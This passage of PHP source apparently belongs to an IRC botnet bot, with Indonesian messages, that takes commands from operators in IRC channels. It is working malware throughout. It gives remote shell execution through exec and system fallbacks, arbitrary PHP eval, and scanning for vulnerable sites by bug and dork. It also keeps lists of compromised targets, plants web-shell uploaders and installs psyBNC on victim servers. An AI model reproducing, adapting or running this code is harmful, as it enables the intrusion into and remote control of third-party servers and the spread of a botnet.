                 foreach ($channel as $v) { fputs($fp, 'JOIN '.$v . CRL); }
               }
               elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]!="User") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(2,7));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]!="User") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!away' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = str_pesan($com[3],$data);
                 if (strlen($msg)<3) { fputs($fp,'AWAY : ' . 'AWAY' . CRL); $raway="on"; }
                 else { fputs($fp,'AWAY : ' . $msg . CRL); $raway="off"; }
               }
               elseif ($com[3]==':!chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass=" [pass ok]"; }
                   else { $pass=" [no pass]"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = str_pesan($com[3],$data);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT JuMpiNG".CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PING 12886241614'. CRL);
                 $msgdelay = 0;
                 foreach ($helptext as $baris) {
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(2) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
               }
               elseif ($com[3]==':!upgrade') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   $soket = fsockopen($bhost,80,$errno,$errstr,10);
                   fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                   fclose($soket);
                   fputs($fp,"NOTICE $dNick :Upgrade Sukses! Exiting..".CRL);
                   fputs($fp,"QUIT :Completed!".CRL);
                   exit();
                 }
               }
               elseif ($com[3]==':!botload') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   $soket = fsockopen($bhost,80,$errno,$errstr,10);
                   fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                   fclose($soket);
                   fputs($fp,"NOTICE $dNick :Botload Sukses!".CRL);
                 }
               }
               /*** CORE COMMANDS BY FaTaLisTiCz_Fx **/
               elseif ($com[3]==':!target' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]=='clear') {
                   unset($targetlist);
                   fputs($fp,'PRIVMSG '.$dNick.' :4Daftar target dihapus!'. CRL);
                 }
                 elseif ($com[4]=='list') {
                   if (!empty($com[5])) { $sendnick = $com[5]; }
                   else { $sendnick = $dNick; }
                   fputs($fp,'PING 12886241614'. CRL);
                   $msgdelay = 0;
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ Internal Target ('.count($targetlist).') ]'. CRL);
                   sort($targetlist);
                   foreach ($targetlist as $baris) {
                     $msgdelay++;
                     if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                     fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL);
                   }
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ The End ]'. CRL);
                 }
                 elseif ($com[4]=='ok') {
                   if (!empty($com[5])) { $sendnick = $com[5]; }
                   else { $sendnick = $dNick; }
                   fputs($fp,'PING 12886241614'. CRL);
                   $msgdelay = 0;
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ Target OK ('.count($targetlist).') ]'. CRL);
                   sort($targetok);
                   foreach ($targetok as $baris) {
                     $msgdelay++;
                     if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                     fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL);
                   }
                   fputs($fp,'PRIVMSG '.$sendnick.' :12[ The End ]'. CRL);
                 }
                 elseif ($com[4]=='total') {
                   fputs($fp,'PRIVMSG '.$dNick.' :12Total Target Internal: '.count($targetlist). CRL);
                 }
                 elseif ($com[4]=='log') {
                   if (!empty($com[6])) { $sendnick = $com[6]; }
                   else { $sendnick = $dNick; }
                   fputs($fp,'PING 12886241614'. CRL);
                   $isi  = file_get_contents($mytargetlog,FILE_TEXT);
                   $isi = nl2br($isi);
                   $isi = str_replace("\n","",$isi);
                   $isi = str_replace("\r","",$isi);
                   $targetlog = explode("<br />",$isi);
                   if ($com[5] == 'show') {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12[ Daftar Target ('.count($targetlog).') ]'. CRL);
                     $msgdelay = 0;
                     foreach ($targetlog as $baris) {
                       $msgdelay++;
                       if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                       if ($baris) { fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL); }
                     }
                     fputs($fp,'PRIVMSG '.$sendnick.' :12[ The End ]'. CRL);
                   }
                   else { fputs($fp,'PRIVMSG '.$sendnick.' :12Total Target 1['.count($targetlog).']'. CRL); }
                 }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :Penggunaan:12 !target <list|total|log|clear> <nick|show>'.CRL); }
                 unset($baris);
                 unset($msgdelay);
                 unset($targetlog);
               }
               elseif ($com[3]==':!open') {
                 if (!empty($com[4])) {
                   $theurl = $com[4];
                   fputs($fp,'PING 12886241614'. CRL);
                   $isi  = file_get_contents($theurl,FILE_TEXT);
                   $isi = nl2br($isi);
                   $isi = str_replace("\n","",$isi);
                   $isi = str_replace("\r","",$isi);
                   $targetlog = explode("<br />",$isi);
                   $msgdelay = 0;
                   $sendnick = $chan;
                   if ($com[5]=='show') {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12.: '.$theurl.' ('.count($targetlog).' baris) :.'.CRL);
                     foreach ($targetlog as $baris) {
                       $msgdelay++;
                       if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                       if ($baris) { fputs($fp,'PRIVMSG '.$sendnick.' :'.$baris. CRL); }
                     }
                     fputs($fp,'PRIVMSG '.$sendnick.' :12.: End of File :.'. CRL);
                   }
                   else {
                     fputs($fp,'PRIVMSG '.$sendnick.' :12.: '.$theurl.' ('.count($targetlog).' baris) :.'.CRL);
                   }
                   unset($baris);
                   unset($msgdelay);
                   unset($targetlog);
                 }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :Penggunaan:12 !open <show> <URL>'.CRL); }
               }
               elseif ($com[3]==':!raw' && $auth["$dNick"]["status"]=="Admin") {
                 $psn = strstr($data,":!raw");
                 $psn = str_replace(":!raw ","",$psn);
                 fputs($fp,$psn.CRL);
               }
               elseif ($com[3]==':!eval' && $auth["$dNick"]["status"]=="Admin") {
                 $psn = strstr($data,":!eval");
                 $psn = str_replace(":!eval ","",$psn);
                 eval($psn);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4Eval:1 '.$psn.CRL); }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :4Eval:1 '.$psn.CRL); }
               }
               elseif ($com[3]==":!cmd" && $auth["$dNick"]["status"]=="Admin") {
                 $psn = strstr($data,":!cmd");
                 $psn = str_replace(":!cmd ","",$psn);
                 fputs($fp,'PING 12886241614'. CRL);
                 $isi = nl2br(ex($psn));
                 $isi = str_replace("\n","",$isi);
                 $isi = str_replace("\r","",$isi);
                 $isi = explode("<br />",$isi);
                 $msgdelay = 0;
                 foreach ($isi as $v) {
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' : '.$v.CRL);
                 }
                 unset($isi); unset($msgdelay);
               }
               elseif ($com[3]==':!debug' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4] == 'on') { $debugmode = 1; }
                 elseif ($com[4] == 'off') { $debugmode = 0; }
                 fputs($fp,'NOTICE '.$dNick.' :12Debugging:1 '.$debugmode.CRL);
               }
               elseif ($com[3]==':!mychan' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) {
                   $changue = strtolower($com[4]);
                   fputs($fp, 'JOIN ' .$changue.CRL);
                 }
                 fputs($fp,'NOTICE '.$dNick.' :12[Channel Gue]1 '.$changue.CRL);
               }
               /*** Master & User Commands ***/
               elseif ($com[3]==':!status') {
                 $statusmsg = '1? Status ? 12New['.$targetnew.'] 3Exist['.$targetold.']4 Spam['.$targetignored.']7 Total['.$targetfound.']';
                 if ($spyscan) { $statusmsg .= '13 Scan[On]'; }
                 else { $statusmsg .= '13 Scan[Off]'; }
                 fputs($fp,'PRIVMSG '.$chan.' :'.$statusmsg.CRL);
               }
               elseif ($com[3]==':!start') {
                 $spyscan = TRUE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION mulai nyari target nih..'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Oke BoZZ, gue cari deh' . CRL); }
               }
               elseif ($com[3]==':!stop') {
                 $spyscan = FALSE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION berhenti nyari target ach..'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Oke BoZZ, gue berhenti nyari'. CRL); }
               }
               elseif ($com[3]==':!scan') {
                 if ($com[4]=='add' && $com[5]) {
                   $msg = str_pesan($com[3].' '.$com[4],$data);
                   if (!in_array($msg,$scanlist)) {
                     $scanlist[] = $msg;
                     if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :Seep..!12 '.$msg.' ditambahkan!'.CRL); }
                     else { fputs($fp,'PRIVMSG '.$dNick.' :Seep..!12 '.$msg.' ditambahkan!'.CRL); }
                   }
                   else { fputs($fp,'NOTICE '.$dNick.' :12 '.$msg.' sudah ada!'.CRL); }
                 }
                 elseif ($com[4]=='del' && $com[5] && $auth["$dNick"]["status"]!="User") {
                   $msg = str_pesan($com[3].' '.$com[4],$data);
                   if (in_array($msg,$scanlist)) {
                     $daftar = join(' ',$scanlist);
                     unset($scanlist);
                     $daftar = str_replace($msg,'',$daftar);
                     $scanlist = explode(' ',$daftar);
                     if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                     else { fputs($fp,'PRIVMSG '.$dNick.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                   }
                   unset($daftar);
                 }
                 elseif ($com[4]=='list') {
                   sort($scanlist);
                   $daftar = join(" | ",$scanlist);
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4D1aftar 4S1can:14 '.$daftar.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :4D1aftar 4S1can:14 '.$daftar.CRL); }
                   unset($daftar);
                 }
                 else {
                   $bugdork = str_pesan($com[3],$data);
                   $arrbug = explode(' ',$bugdork);
                   $thebug = $arrbug[0];
                   $thedork = str_replace($thebug,'',$bugdork);
                   if ($com[5]) {
                     if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION nyoba scanning 4Bug:14 '.$thebug.' 4Dork:14 '.$thedork.''. CRL); }
                     else { fputs($fp,'PRIVMSG '.$dNick.' :Scanning 4Bug:14 '.$thebug.' 4Dork:14 '.$thedork.''. CRL); }
                     foreach ($channel as $v) {
                       fputs($fp,'PRIVMSG '.$v.' :!scan '.$bugdork. CRL);
                     }
                   }
                   else {
                     fputs($fp,'PRIVMSG '.$dNick.' :Penggunaan:4 !scan <bug> <dork> 1atau 4!scan <add|del|list> <text>'. CRL);
                   }
                 }
               }
               elseif ($com[3]==':!ganti' && $auth["$dNick"]["status"]!="User") {
                 $msg = str_pesan($com[3],$data);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION ganti '.$msg.' deh'. CRL); }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :'.$msg.' diganti.'. CRL); }
                 $gantilist[] = $msg;
               }
               elseif ($com[3]==':!delganti' && $auth["$dNick"]["status"]!="User") {
                 $msg = str_pesan($com[3],$data);
                 if (in_array($msg,$gantilist)) {
                   $daftar = join(' ',$gantilist);
                   unset($gantilist);
                   $daftar = str_replace($msg,'',$daftar);
                   $gantilist = explode(' ',$daftar);
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                 }
                 unset($daftar);
               }
               elseif ($com[3]==':!gantilist') {
                 fputs($fp,'PING 12886241614'. CRL);
                 $msgdelay = 0;
                 fputs($fp,'PRIVMSG '.$dNick.' :12.: Daftar Injector :.'. CRL);
                 sort($gantilist);
                 foreach ($gantilist as $baris) {
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(3) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 fputs($fp,'PRIVMSG '.$dNick.' :12.: The End :.'. CRL);
                 unset($baris);
                 unset($msgdelay);
               }
               elseif ($com[3]==':!ignore') {
                 $ignore = str_pesan($com[3],$data);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :Oke bozZ!!4 '.$ignore.' ga ditampilkan lagi deh..'. CRL); }
                 else { fputs($fp,'PRIVMSG '.$dNick.' :Oke bozZ!!4 '.$ignore.' ga ditampilkan lagi deh..'. CRL); }
                 $ignorelist[] = $ignore;
               }
               elseif ($com[3]==':!delignore' && $auth["$dNick"]["status"]!="User") {
                 $msg = str_pesan($com[3],$data);
                 if (in_array($msg,$ignorelist)) {
                   $daftar = join(' ',$ignorelist);
                   unset($ignorelist);
                   $daftar = str_replace($msg,'',$daftar);
                   $ignorelist = explode(' ',$daftar);
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :OKey..!12 '.$msg.' dihapus!'.CRL); }
                 }
                 unset($daftar);
               }
               elseif ($com[3]==':!ignorelist') {
                 sort($ignorelist);
                 $daftar = join(" | ",$ignorelist);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4D1aftar 4I1gnore:14 '.$daftar.CRL); }
                 else { fputs($fp,'PRIVMSG'.$dNick.' :4D1aftar 4I1gnore:14 '.$daftar.CRL); }
                 unset($daftar);
               }
               elseif ($com[3]==':!tanam' && $auth["$dNick"]["status"]!="User") {
                 $testurl = strstr($data,":!tanam");
                 $testurl = str_replace(":!tanam ","",$testurl);
                 $theurl = $testurl.$myshelluploader;
                 $isi = implode('', @file($theurl));
                 $posisi = strpos($isi,"Saved! File:");
                 $isi = substr($isi,$posisi);
                 if ($posisi === FALSE) {
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4[Error]1 Akses ditolak!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :4Error:1 Akses ditolak!'.CRL); }
                 }
                 else {
                   $isi = str_replace("Saved! File:","12[Sukses!]1 Dir: ",$isi);
                   fputs($fp,'PRIVMSG '.$dNick.' :12U1ploaded:14 '.$testurl.CRL);
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$isi.CRL);
                 }
                 unset($isi);
               }
               elseif ($com[3]==':!psy' && $auth["$dNick"]["status"]!="User") {
                 $testurl = str_pesan($com[3],$data);
                 $theurl = $testurl.$mypsyinstaller;
                 $isi = implode('', @file($theurl));
                 $posisi = strpos($isi,".fx");
                 $isi = substr($isi,$posisi);
                 if ($posisi === FALSE) {
                   if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4[Error]1 Ga bisa install psyBNC!'.CRL); }
                   else { fputs($fp,'PRIVMSG '.$dNick.' :4Error:1 Ga bisa install psyBNC!'.CRL); }
                 }
                 else {
                   fputs($fp,'PRIVMSG '.$dNick.' :12psyBNC1 installed on:14 '.$testurl.CRL);
                   fputs($fp,'PRIVMSG '.$dNick.' :12H1asil:14 '.$isi.CRL);
                 }
                 unset($isi);
               }
             }
             /*** End of Script ***/
           }
         }
       }
    }
    elseif (substr($data,0,4) == 'PING') {
      fputs($fp,'PONG '.substr($data,5).CRL);
      $statusdelay++;
      if ($statusdelay>=10) {
        $statusmsg = '1? Status ? 12New['.$targetnew.'] 3Exist['.$targetold.']4 Spam['.$targetignored.']7 Total['.$targetfound.']';
        if ($spyscan) { $statusmsg .= '13 Scan[On]'; }
        else { $statusmsg .= '13 Scan[Off]'; }
        fputs($fp,'PRIVMSG '.$changue.' :'.$statusmsg.CRL);
        $statusdelay = 0;
      }
    }
  }
  }
  fclose($fp);
} while ($keluar == 0);

/* FUNCTIONS */
function ex($cfe) {
  $res = '';
  if (!empty($cfe)) {
    if(function_exists('exec')) {
      @exec($cfe,$res);
      $res = join("\n",$res);
    } elseif(function_exists('shell_exec')) {
      $res = @shell_exec($cfe);
    } elseif(function_exists('system')) {
      @ob_start();
      @system($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(function_exists('passthru')) {
      @ob_start();
      @passthru($cfe);
      $res = @ob_get_contents();
      @ob_end_clean();
    } elseif(@is_resource($f = @popen($cfe,"r"))) {
      $res = "";
      while(!@feof($f)) { $res .= @fread($f,1024); }
      @pclose($f);
    } else { $res = "Ex() Disabled!"; }
  }
  return $res;
}

?>


